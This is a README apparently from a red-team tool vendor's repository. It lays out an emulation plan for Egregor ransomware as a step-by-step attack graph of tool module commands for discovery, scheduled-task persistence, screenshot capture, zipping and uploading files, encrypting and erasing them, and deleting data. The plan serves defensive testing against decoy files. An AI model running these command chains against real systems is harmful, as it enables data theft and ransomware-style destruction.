# Egregor Adversary Emulation Plan

This threat is explained further in SCYTHE's Threat Thursday blog: https://www.scythe.io/library/threatthursday-egregor

To emulate:
1. Download and import the threat in JSON format to your SCYTHE instance - https://raw.githubusercontent.com/scythe-io/community-threats/master/Egregor/Egregor_scythe_threat.json
2. Download the Virtual File System (VFS) files under Egregor/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/egregor
4. Go to the Threat Catalog and select "Egregor"
5. Click "Create Campaign from Threat"
6. Name the Campaign
7. Parameters: Replace unicorn.scythedemo.com with your SCYTHE instance IP address or FQDN.
8. Add Execution Guardrails under "Restrict Campaign"
9. Launch the Campaign
10. Execute via Rundll32.exe


 #Attack Graph
```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br><a href='https://attack.mitre.org/techniques/T1071'>att&ck-technique:T1071</a><br>
<a href='https://attack.mitre.org/techniques/T1078'>att&ck-technique:T1078</a><br>
<a href='https://attack.mitre.org/techniques/T1078.003'>att&ck-technique:T1078.003</a><br>
"]
Step2["<b> module: run </b> <br><h4> parameters: </h4> <i> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language </i> <br><a href='https://attack.mitre.org/techniques/T1012'>att&ck-technique:T1012</a><br>
"]
Step3["<b> module: run </b> <br><h4> parameters: </h4> <i> whoami </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
<a href='https://attack.mitre.org/techniques/T1059.003'>att&ck-technique:T1059.003</a><br>
"]
Step4["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load printscr </i> <br><a href='https://attack.mitre.org/techniques/T1480'>att&ck-technique:T1480</a><br>
"]
Step5["<b> module: printscr </b> <br><h4> parameters: </h4> <i> --window Desktop </i> <br><a href='https://attack.mitre.org/tactics/TA0009'>att&ck-tactic:TA0009</a><br>
<a href='https://attack.mitre.org/techniques/T1113'>att&ck-technique:T1113</a><br>
"]
Step6["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load sysinfo </i> <br><a href='https://attack.mitre.org/techniques/T1071.001'>att&ck-technique:T1071.001</a><br>
"]
Step7["<b> module: sysinfo </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step8["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load processes </i> <br><a href='https://attack.mitre.org/techniques/T1204.002'>att&ck-technique:T1204.002</a><br>
"]
Step9["<b> module: processes </b> <br><h4> parameters: </h4> <i>  </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1057'>att&ck-technique:T1057</a><br>
"]
Step10["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c dir %USERPROFILE%\Documents </i> <br><a href='https://attack.mitre.org/tactics/TA0007'>att&ck-tactic:TA0007</a><br>
<a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step11["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load upsh </i> <br>"]
Step12["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct </i> <br><a href='https://attack.mitre.org/techniques/T1518.001'>att&ck-technique:T1518.001</a><br>
"]
Step13["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Get-DnsClientServerAddress </i> <br><a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step14["<b> module: run </b> <br><h4> parameters: </h4> <i> net use </i> <br><a href='https://attack.mitre.org/techniques/T1016'>att&ck-technique:T1016</a><br>
"]
Step15["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /CREATE /SC DAILY /TN MyTasks\Example Task /TR C:\example_service.exe /ST 11:00 /F </i> <br><a href='https://attack.mitre.org/techniques/T1053'>att&ck-technique:T1053</a><br>
"]
Step16["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /QUERY /TN MyTasks\Example Task </i> <br><a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step17["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c hostname </i> <br><a href='https://attack.mitre.org/techniques/T1082'>att&ck-technique:T1082</a><br>
"]
Step18["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load crypt </i> <br>"]
Step19["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br>"]
Step20["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load file </i> <br>"]
Step21["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load uploader </i> <br>"]
Step22["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c mkdir %USERPROFILE%\Desktop\egregor </i> <br><a href='https://attack.mitre.org/techniques/T1059'>att&ck-technique:T1059</a><br>
"]
Step23["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c mkdir %USERPROFILE%\Desktop\egregor\x_malicious_files </i> <br><a href='https://attack.mitre.org/techniques/T1059'>att&ck-technique:T1059</a><br>
"]
Step24["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c mkdir %USERPROFILE%\Desktop\egregor\x_target_files </i> <br><a href='https://attack.mitre.org/techniques/T1059'>att&ck-technique:T1059</a><br>
"]
Step25["<b> module: file </b> <br><h4> parameters: </h4> <i> --create --path %USERPROFILE%\Desktop\egregor\x_target_files\target_file.xls --size 5MB --count 10 --random </i> <br><a href='https://attack.mitre.org/techniques/T1078'>att&ck-technique:T1078</a><br>
"]
Step26["<b> module: file </b> <br><h4> parameters: </h4> <i> --create --path %USERPROFILE%\Desktop\egregor\x_target_files\abcdefgh.lnk --size 1MB --random </i> <br><a href='https://attack.mitre.org/techniques/T1078'>att&ck-technique:T1078</a><br>
"]
Step27["<b> module: file </b> <br><h4> parameters: </h4> <i> --create --path %ProgramData%\dtb.dat --size 1MB --random </i> <br><a href='https://attack.mitre.org/techniques/T1078'>att&ck-technique:T1078</a><br>
"]
Step28["<b> module: upsh </b> <br><h4> parameters: </h4> <i> --cmd Compress-Archive -Path $env:userprofile\Desktop\egregor\x_target_files -CompressionLevel Optimal -Destination $env:userprofile\Desktop\egregor\exfil.zip </i> <br><a href='https://attack.mitre.org/techniques/T1560.002'>att&ck-technique:T1560.002</a><br>
<a href='https://attack.mitre.org/techniques/T1074.001'>att&ck-technique:T1074.001</a><br>
"]
Step29["<b> module: uploader </b> <br><h4> parameters: </h4> <i> --remotepath %USERPROFILE%\Desktop\egregor\exfil.zip </i> <br><a href='https://attack.mitre.org/techniques/T1041'>att&ck-technique:T1041</a><br>
<a href='https://attack.mitre.org/techniques/T1005'>att&ck-technique:T1005</a><br>
"]
Step30["<b> module: crypt </b> <br><h4> parameters: </h4> <i> --target %USERPROFILE%\Desktop\egregor\x_target_files\ --encrypt --password h3ll0w0rld --erase </i> <br><a href='https://attack.mitre.org/techniques/T1486'>att&ck-technique:T1486</a><br>
"]
Step31["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src VFS:/shared/threats/egregor/RECOVER-FILES.txt --dest %USERPROFILE%\Desktop\egregor\x_malicious_files\RECOVER-FILES.txt </i> <br><a href='https://attack.mitre.org/techniques/T1105'>att&ck-technique:T1105</a><br>
"]
Step32[""]
Step33["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c SCHTASKS /DELETE /TN MyTasks\Example Task /F </i> <br><a href='https://attack.mitre.org/techniques/T1053'>att&ck-technique:T1053</a><br>
<a href='https://attack.mitre.org/techniques/T1053.005'>att&ck-technique:T1053.005</a><br>
"]
Step34["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c rmdir /Q /S %USERPROFILE%\Desktop\egregor </i> <br><a href='https://attack.mitre.org/techniques/T1485'>att&ck-technique:T1485</a><br>
"]
Step35["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c del %ProgramData%\dtb.dat </i> <br><a href='https://attack.mitre.org/techniques/T1485'>att&ck-technique:T1485</a><br>
"]
Step36["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
Step11 --> Step12
Step12 --> Step13
Step13 --> Step14
Step14 --> Step15
Step15 --> Step16
Step16 --> Step17
Step17 --> Step18
Step18 --> Step19
Step19 --> Step20
Step20 --> Step21
Step21 --> Step22
Step22 --> Step23
Step23 --> Step24
Step24 --> Step25
Step25 --> Step26
Step26 --> Step27
Step27 --> Step28
Step28 --> Step29
Step29 --> Step30
Step30 --> Step31
Step31 --> Step32
Step32 --> Step33
Step33 --> Step34
Step34 --> Step35
Step35 --> Step36
Step36 --> Step37
```
